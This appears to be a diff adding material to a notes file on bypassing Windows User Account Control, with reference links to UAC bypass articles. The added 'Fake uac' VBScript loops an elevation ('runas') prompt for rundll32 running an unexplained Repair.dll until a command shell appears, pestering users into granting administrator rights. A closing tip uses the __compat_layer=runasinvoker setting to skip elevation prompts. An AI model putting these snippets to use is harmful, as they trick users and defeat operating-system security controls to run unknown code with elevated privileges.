@@ -1,3 +1,30 @@
+Fake uac :
+
+
+```
+Dim objFSO, objFile, strScriptPath, strCurrentDir
+
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objFile = objFSO.GetFile(WScript.ScriptFullName)
+strScriptPath = objFile.ParentFolder.Path
+strCurrentDir = objFSO.GetAbsolutePathName(strScriptPath)
+
+Set objShell = CreateObject("Shell.Application")
+Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")
+
+Do
+   objShell.ShellExecute "rundll32.exe", strCurrentDir & "\Repair.dll,Repair", "", "runas", 1
+   Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='cmd.exe'")
+   For Each objProcess in colProcesses
+       Exit Do
+   Next
+Loop
+
+
+
+```
+
+
 Table of Contents
 _________________
 
@@ -309,5 +336,15 @@ _________________
   Hack Tricks, UAC - User Account Control
   <https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control>
 
+.
   By Pass UAC Using Fodhelper
   <https://nadimsaliby.medium.com/by-pass-uac-using-fodhelper-e4a94e04d5f0>
+
+
+
+
+
+try this 
+-set ___compat_layer=runasinvoker
+-start steamsetup.exe
+
